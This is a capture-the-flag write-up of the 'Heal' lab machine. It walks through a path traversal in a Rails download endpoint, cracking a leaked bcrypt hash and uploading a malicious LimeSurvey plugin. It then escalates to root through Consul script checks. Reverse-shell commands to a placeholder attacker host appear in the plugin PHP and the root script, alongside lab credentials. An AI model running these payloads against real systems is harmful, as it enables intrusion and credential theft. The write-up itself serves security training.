---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Heal
Linux machine.

## Foothold

nmap scan
```bash
nmap -sC -sV -vv 10.10.11.46 -p-
```

```
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFWKy4neTpMZp5wFROezpCVZeStDXH5gI5zP4XB9UarPr/qBNNViyJsTTIzQkCwYb2GwaKqDZ3s60sEZw362L0o=
|   256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMCYbmj9e7GtvnDNH/PoXrtZbCxr49qUY8gUwHmvDKU
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Update etc hosts:
```bash
sudo vim /etc/hosts
```

```
10.10.11.46     heal.htb
```

Access the web. Once we try to log in there is an error (not sure why) and the request gets send to api.heal.htb (We can see that in burp for example). Let's add it to `/etc/hosts`:
```
10.10.11.46     heal.htb api.heal.htb
```

??? note "Side track?"

    Also, the web is sending wierd requests (seems like <https://www.npmjs.com/package/sockjs-client> 1.3.0/1.4.0 <https://github.com/sockjs/sockjs-node>):
    ```
    POST /sockjs-node/555/vwvknmsm/xhr?t=1743255750887 HTTP/1.1
    ```
    
    If we access `heal.htb/sockjs-node/` we get a welcome message
    ```
    Welcome to SockJS!
    ```
    
    If we use a repeater for one of the `sockjs-node` post actions (`POST /sockjs-node/555/vwvknmsm/xhr?t=1743255876325 HTTP/1.1`), we get random responses:
    ```
    a["{\"type\":\"hot\"}","{\"type\":\"log-level\",\"data\":\"none\"}","{\"type\":\"hash\",\"data\":\"1cc6c4d7b26c571c326e\"}","{\"type\":\"warnings\",\"data\":[\"./src/components/ResumeForm.js\\nModule Warning (from ./node_modules/eslint-loader/index.js):\\n\\n  Line 18:10:  'error' is assigned a value but never used     no-unused-vars\\n  Line 23:15:  'response' is assigned a value but never used  no-unused-vars\\n\\n\"]}"]
    ```
    `h`, `o`, `a`
    ```
    c[2010,"Another connection still open"]
    ```

    In the developer tools window in console, we can see multiple errors:
    ```
    Uncaught Error: Incompatible SockJS! Main site uses: "1.4.0", the iframe: "1.3.0".
    ```
    ```
    Firefox can’t establish a connection to the server at ws://heal.htb/sockjs-node/625/43hphazw/websocket.
    ```

If we check the source code of heal.htb (in burp or browser: view source code), it says it is a template created by `create-react-app` (<https://create-react-app.dev/docs/getting-started/>) and there is a link to http://heal.htb/manifest.json.

We can also see from the response, it is ExpressJS `X-Powered-By: Express`.

If we check the developer tools window (F12 in the browser), we see errors in the console and source code of the whole application in the debugger (debugger -> sources).

From the source code we know now, there is a user `ralph` and the app is in `home/ralph/resume-builder` - probably.

In the code (`TakeSurvey.js`) we also found take-survey.heal.htb (<http://take-survey.heal.htb/index.php/552933?lang=en>), so let's add it to `/etc/hosts`. It's a php.

The api.heal.htb states it is running Ruby:
```
Rails version: 7.1.4
Ruby version: ruby 3.3.5 (2024-09-03 revision ef084cc8f4) [x86_64-linux]
```

Okay... let's get back on track. In the source code, we can see multiple calls pointing to api.heal.htb.

let's sign up, sign in, create a CV, and export it. 
Now we see, and also check in the code found earlier, that it calls `api.heal.htb/download?filename=`. Let's use it in burp repeater to get the `/etc/passwd` file:
```
GET /download?filename=/etc/passwd HTTP/1.1
Host: api.heal.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1fQ.7HQbv7vTQa-UIbcu3TPdEgxs3zZG0tYpT-yOC5uxMbM
Origin: http://heal.htb
Connection: keep-alive
Referer: http://heal.htb/
Priority: u=0

```

We get:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
ralph:x:1000:1000:ralph:/home/ralph:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
avahi:x:114:120:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
geoclue:x:115:121::/var/lib/geoclue:/usr/sbin/nologin
postgres:x:116:123:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
ron:x:1001:1001:,,,:/home/ron:/bin/bash
```

We are unable to get `/home/ralph/user.txt` so the user we need is `ron`. However, the app is running under the user `ralph` since we can access `/home/ralph/.profile`.

So, what should we enumerate next? We already have the source code to the `heal.htb` in the dev tools window. Let's try to find `api.heal.htb`. We will use the `api.heal.htb/download?filename=` endpoint.

On the http://api.heal.htb/ we see link to https://rubyonrails.org/. Let's check the docs -> guides. We get to <https://guides.rubyonrails.org/getting_started.html>. which will reveal the whole directory structure we can enumerate and how the whole app works. 

Even better, we can initialize a rails repo on our machine:
```bash
rails new test_rails_app
```
This will give us the default base structure which we can enumerate:
```
      create  
      create  README.md
      create  Rakefile
      create  .ruby-version
      create  config.ru
      create  .gitignore
      create  .gitattributes
      create  Gemfile
         run  git init -b main from "."
Initialized empty Git repository in /home/vagrant/test_rails_app/.git/
      create  app
      create  app/assets/config/manifest.js
      create  app/assets/stylesheets/application.css
      create  app/channels/application_cable/channel.rb
      create  app/channels/application_cable/connection.rb
      create  app/controllers/application_controller.rb
      create  app/helpers/application_helper.rb
      create  app/jobs/application_job.rb
      create  app/mailers/application_mailer.rb
      create  app/models/application_record.rb
      create  app/views/layouts/application.html.erb
      create  app/views/layouts/mailer.html.erb
      create  app/views/layouts/mailer.text.erb
      create  app/views/pwa/manifest.json.erb
      create  app/views/pwa/service-worker.js
      create  app/assets/images
      create  app/assets/images/.keep
      create  app/controllers/concerns/.keep
      create  app/models/concerns/.keep
      create  bin
      create  bin/brakeman
      create  bin/rails
      create  bin/rake
      create  bin/rubocop
      create  bin/setup
      create  Dockerfile
      create  .dockerignore
      create  bin/docker-entrypoint
      create  .rubocop.yml
      create  .github/workflows
      create  .github/workflows/ci.yml
      create  .github/dependabot.yml
      create  config
      create  config/routes.rb
      create  config/application.rb
      create  config/environment.rb
      create  config/cable.yml
      create  config/puma.rb
      create  config/storage.yml
      create  config/environments
      create  config/environments/development.rb
      create  config/environments/production.rb
      create  config/environments/test.rb
      create  config/initializers
      create  config/initializers/assets.rb
      create  config/initializers/content_security_policy.rb
      create  config/initializers/cors.rb
      create  config/initializers/filter_parameter_logging.rb
      create  config/initializers/inflections.rb
      create  config/initializers/new_framework_defaults_7_2.rb
      create  config/initializers/permissions_policy.rb
      create  config/locales
      create  config/locales/en.yml
      create  config/master.key
      append  .gitignore
      create  config/boot.rb
      create  config/database.yml
      create  db
      create  db/seeds.rb
      create  lib
      create  lib/tasks
      create  lib/tasks/.keep
      create  lib/assets
      create  lib/assets/.keep
      create  log
      create  log/.keep
      create  public
      create  public/404.html
      create  public/406-unsupported-browser.html
      create  public/422.html
      create  public/500.html
      create  public/icon.png
      create  public/icon.svg
      create  public/robots.txt
      create  tmp
      create  tmp/.keep
      create  tmp/pids
      create  tmp/pids/.keep
      create  vendor
      create  vendor/.keep
      create  test/fixtures/files
      create  test/fixtures/files/.keep
      create  test/controllers
      create  test/controllers/.keep
      create  test/mailers
      create  test/mailers/.keep
      create  test/models
      create  test/models/.keep
      create  test/helpers
      create  test/helpers/.keep
      create  test/integration
      create  test/integration/.keep
      create  test/channels/application_cable/connection_test.rb
      create  test/test_helper.rb
      create  test/system
      create  test/system/.keep
      create  test/application_system_test_case.rb
      create  storage
      create  storage/.keep
      create  tmp/storage
      create  tmp/storage/.keep
      remove  config/initializers/cors.rb
      remove  config/initializers/new_framework_defaults_7_2.rb
         run  bundle install --local --quiet
```

!!! tip ".gitignore is also useful"

    In case we don't know where to go, `.gitignore` is also a useful file to list files `GET /download?filename=../../.gitignore`.

Lot of the files are interesting, the most could be `config/database.yml`. Which could give us DB credentials.
```
GET /download?filename=../../config/database.yml
```
```
# SQLite. Versions 3.8.0 and up are supported.
#   gem install sqlite3
#
#   Ensure the SQLite 3 gem is defined in your Gemfile
#   gem "sqlite3"
#
default: &default
  adapter: sqlite3
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
  timeout: 5000

development:
  <<: *default
  database: storage/development.sqlite3

# Warning: The database defined as "test" will be erased and
# re-generated from your development database when you run "rake".
# Do not set this db to the same as development or production.
test:
  <<: *default
  database: storage/test.sqlite3

production:
  <<: *default
  database: storage/development.sqlite3

```

We get pointed to `storage/development.sqlite3`.
```
GET /download?filename=../../storage/development.sqlite3
```
We get a lot of data, but the most important is:
```
ralph@heal.htb$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG2024-09-27 07:49:31.6148582024-09-27 07:49:31.614858Administratorralph

```

We extract the password (remove mail and date):
```
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
```

Add it to `hash.txt` and crack it:
```bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

We get:
```
ralph:147258369
```

We can log in, but there is nothing for us to do.

??? note "possibly side track"

    We want to get the endpoint code. To do soo, we have to check [this](https://guides.rubyonrails.org/getting_started.html#rails-routes) section in the docs.
    
    The routes are in the `routes.rb` file. `GET /download?filename=../../config/routes.rb`
    
    The endpoints have the following structure. `/exports` request is sent to `routers.rb` which then sends it to [controller](https://guides.rubyonrails.org/getting_started.html#controllers-actions) `app/controllers/exports_controller.rb`
    
    Let's get the exports' controller:
    ```
    GET /download?filename=../../app/controllers/exports_controller.rb
    ```
    
    ??? note "controller"
    
        ```ruby
        require 'rexml/document'
        require 'imgkit'
        require 'open3'
        
        class ExportsController < ApplicationController
          before_action :authorize_request
        
          def create
            html_content = params[:content]
            format = params[:format] || 'png'
            css_path = Rails.root.join('app', 'assets', 'stylesheets', 'styles.css').to_s
            
            filename = "#{SecureRandom.hex(10)}.#{format}"
            filepath = Rails.root.join('private', 'exports', filename)
        
            if format == 'pdf'
              generate_pdf(html_content, filepath, css_path)
            else
              generate_png(html_content, filepath, css_path)
            end
        
            render json: { message: "#{format.upcase} created successfully", filename: filename }, status: :created
          end
        
        
          def download
            begin
              file_path = Rails.root.join('private', 'exports', params[:filename])
              send_file(file_path, disposition: 'attachment')
            rescue ActionController::MissingFile
              render json: { errors: 'File not found' }, status: :not_found
            rescue StandardError => e
              render json: { errors: "Error downloading file: #{e.message}" }, status: :internal_server_error
            end
          end
        
        
          private
        
          def authorize_request
            header = request.headers['Authorization']
            header = header.split(' ').last if header
            begin
              decoded = JWT.decode(header, Rails.application.credentials.secret_key_base, true, { algorithm: 'HS256' })[0]
              @current_user = User.find(decoded['user_id'])
            rescue JWT::DecodeError
              render json: { errors: 'Invalid token' }, status: :unauthorized
            rescue ActiveRecord::RecordNotFound
              render json: { errors: 'Invalid token' }, status: :unauthorized
            end
          end
        
          def get_mime_type(filepath)
            case File.extname(filepath)
            when '.pdf'
              'application/pdf'
            when '.png'
              'image/png'
            else
              'application/octet-stream'
            end
          end
        
          def generate_pdf(html_content, filepath, css_path)
            command = "wkhtmltopdf --proxy None --user-style-sheet #{css_path} - #{filepath}"
            Open3.popen3(command) do |stdin, stdout, stderr, wait_thr|
              stdin.write(html_content)
              stdin.close
        
              exit_status = wait_thr.value
              unless exit_status.success?
                raise "Error generating PDF: #{stderr.read}"
              end
            end
          end
        
          def generate_png(html_content, filepath, css_path)
            kit = IMGKit.new(html_content, quality: 50)
            kit.stylesheets << css_path
            png = kit.to_img(:png)
            File.open(filepath, 'wb') do |file|
              file.write(png)
            end
          end
        end
        
        ```
    
    Not sure about RCE. It should be also possible to exploit the wkhtmltopdf it uses.

    https://wkhtmltopdf.org/usage/wkhtmltopdf.txt
    https://github.com/wkhtmltopdf/wkhtmltopdf
    https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/
    https://github.com/wkhtmltopdf/wkhtmltopdf/issues/5249
    https://www.exploit-db.com/exploits/51039
    
    https://semgrep.dev/docs/cheat-sheets/ruby-command-injection

??? note "Another side track"

    Let's download the credentials.yml.enc which contains the secret_key used by the `app/controllers/authentication_controller.rb`.
    ```
    GET /download?filename=../../config/credentials.yml.enc
    ```
    Also, the master key that is used for secret_key encryption.
    ```
    GET /download?filename=../../config/master.key
    ```
    
    https://webcrunch.com/posts/the-complete-guide-to-ruby-on-rails-encrypted-credentials  
    https://www.daehee.com/blog/decrypt-ruby-on-rails-credentials/

Let's check out the `take-survey` subdomain.

At the http://take-survey.heal.htb/ we see the mail `ralph@heal.htb`.

We see it's LimeSurvey and there is a link to the product on the page. Go there and find the documentation https://www.limesurvey.org/manual/LimeSurvey_Manual. There we can find that there is an admin section <http://take-survey.heal.htb/admin/>. Let's use the found credentials for ralph. Success.

We can see that there are plugins and we can upload a custom one. I have a zero clue how one looks like and the documentation has no simple example and is too long. Let's try to find an alternative. LimeSurvey has a GitHub repository <https://github.com/LimeSurvey/LimeSurvey/tree/master>. Let's take a plugin for example <https://github.com/LimeSurvey/LimeSurvey/tree/master/application/core/plugins/Authdb>. We will create our own. 

Create a directory `abc` and inside it `config.xml` and `abc.php`.

config.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
<config>
    <metadata>
        <name>abc</name>
        <type>plugin</type>
        <creationDate>2013-04-05</creationDate>
        <lastUpdate>2018-01-24</lastUpdate>
        <author>Menno Dekker</author>
        <authorUrl>https://www.limesurvey.org</authorUrl>
        <version>1.0.0</version>
        <license>GNU General Public License version 2 or later</license>
        <description><![CDATA[Core: LDAP authentication]]></description>
    </metadata>

    <compatibility>
        <version>6.0</version>
        <version>5.0</version>
        <version>4.0</version>
        <version>3.0</version>
        <version>2.73</version>
    </compatibility>

    <updaters disabled="disabled">
    </updaters>
</config>
```

abc.php
```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/<ATTACKER_IP>/1234 0>&1'");
```

Final structure.
```
abc
├── abc.php
└── config.xml
```

ZIP it:
```bash
zip -r abc.zip abc
```

Start a listener on the attacker:
```bash
nc -lvnp 1234
```

Upload it at <http://take-survey.heal.htb/index.php/admin/pluginmanager/sa/index>. Once it is installed, click on action and activate it. We get reverse shell.

Shell not gud, let's fix it a little. Download pty shells. `Update the tcp_pty_backconnect.py` and then base64 it:
```bash
cat tcp_pty_backconnect.py | base64 -w 0
```

Start listener:
```
python3 tcp_pty_shell_handler.py -b 0.0.0.0:1111
```

```
echo <base64-backconnect> | base64 -d | python3
```

We have much better shell.

??? note "some vulns for limesurvey"

    Let's search for CVE on LimeSurvey. We get https://security.snyk.io/package/composer/limesurvey%2Flimesurvey or https://github.com/advisories/GHSA-wqr2-8c98-rxv3 and there is a poc https://github.com/sysentr0py/CVEs/tree/main/CVE-2024-42902 for LFI.
    
    The vuln can be found here in the code: https://github.com/LimeSurvey/LimeSurvey/blob/master/vendor/kcfinder/js_localize.php#L26.

## User

Since we know the [LimeSurvey uses DB](https://www.limesurvey.org/manual/Installation_-_LimeSurvey_CE/en), and there is a postgres, we will search for config.php. Otherwise, we could search for "password" in files with grep.

```bash
cat application/config/config.php
```
```
'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',
'emulatePrepare' => true,
'username' => 'db_user',
'password' => 'AdmiDi0_pA$$w0rd',
'charset' => 'utf8',
'tablePrefix' => 'lime_',
```

??? note "dead end"

    ```bash
    psql -h 127.0.0.1 -U db_user -d survey
    ```
    list database tables
    ```
    \d
    ```
    
    ```
    SELECT * FROM lime_users;
    ```
    
    No luck here. Let's take a different approach.

We know there are two users. Let's use the password for each: `ralph`, `ron`.

```bash
ssh ron@heal.htb
```

Success! Get the user flag.

## Root

??? note "side quest with linpeas"

    download linpeas and serve http server:
    ```bash
    wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
    python3 -m http.server
    ```
    
    On the victim, create dir, download linpeas and run them:
    ```bash
    mkdir /tmp/.sad
    cd /tmp/.sad
    wget http://10.10.14.14:8000/linpeas.sh
    chmod +x linpeas.sh
    ./linpeas.sh
    ```

This seems odd: (`ps aux`)
```
root        1872  0.5  2.5 1357284 100084 ?      Ssl  15:53   0:20 /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d
```

If we access the `/etc/consul.d`, we find config.json:
```json
{
"bootstrap":true,
"server": true,
"log_level": "DEBUG",
"enable_syslog": true,
"enable_script_checks": true,
"datacenter":"server1",
"addresses": {
        "http":"127.0.0.1"
},
"bind_addr": "127.0.0.1",
"node_name":"heal-internal",
"data_dir":"/var/lib/consul",
"acl_datacenter":"heal-server",
"acl_default_policy":"allow",
"encrypt":"l5/ztsxHF+OWZmTkjlLo92IrBBCRTTNDpdUpg2mJnmQ="
}
```

Let's try a command that does something:
```bash
consul members
```

```
Node       Address         Status  Type    Build   Protocol  DC       Partition  Segment
consul-01  127.0.0.1:8301  alive   server  1.19.2  2         server1  default    <all>
```

Now if we try exec, we get no response, or rather we get `0 / 0 node(s) completed / acknowledged`. Now, after we paste it into google, we get a person with the same problem on the stack overflow. He resolves it with `disable_remote_exec=false` in the config. Aha!

The agent running under root has `"enable_script_checks": true`. Let's search the documentation of the consul. We get <https://developer.hashicorp.com/consul/docs/agent/config/cli-flags#_enable_script_checks>. And we see a big security warning. This is it!

Create a `/tmp/.sad/do.sh` file with (nc is again useless since it is the other netcat):
```
#!/bin/bash
/bin/bash -c 'bash -i > /dev/tcp/<ATTACKER_IP>/1234 0>&1'
```

Add executable rights:
```bash
chmod +x do.sh
```

Let's create a script check ([service](https://developer.hashicorp.com/consul/docs/services/usage/define-services) and [healthcheck](https://developer.hashicorp.com/consul/docs/services/usage/checks) documentation) (`x.json`):
```json
{
  "service": {
    "name": "a",
    "id": "a-1",
    "port": 1111,
    "check": {
      "args": ["/tmp/.sad/do.sh", ""],
      "interval": "5s",
      "timeout": "999s"
    }
  }
}

```
register it:
```bash
consul services register asd.json 
```
We get:
```
Error registering service "x": Unexpected response code: 400 (Invalid check: TTL must be > 0 for TTL checks)
```

Let's google that error and we find <https://discuss.hashicorp.com/t/get-error-unexpected-response-code-400-invalid-check-ttl-must-be-0-for-ttl-checks-when-register-service-with-args-check/34215>. It is a bug!!!! kill me pls.

Update the `x.json` file accordingly:
```json
{
  "name": "a",
  "id": "a-1",
  "port": 1111,
  "check": {
    "args": ["/tmp/.sad/do.sh", ""],
    "interval": "5s",
    "timeout": "999s"
  }
}

```

Start a listener on the attacker:
```bash
nc -lvnp 1234
```

Upload it:
```bash
curl --request PUT --data @x.json http://127.0.0.1:8500/v1/agent/service/register
```

??? note "bit more clear"

    Found [here](https://gitlab.com/gitlab-org/omnibus-gitlab/-/issues/8171).
    Create check only (`x.json`):
    ```json
    {
      "id": "test",
      "name": "code exec",
      "args": ["/tmp/.sad/do.sh", ""],
      "interval": "5s",
      "timeout": "999s"
    }
    ```
    
    Start it:
    curl -X PUT --data @x.json http://127.0.0.1:8500/v1/agent/check/register
    
    Stop it:
    curl -X PUT http://127.0.0.1:8500/v1/agent/check/deregister/test

We are in!
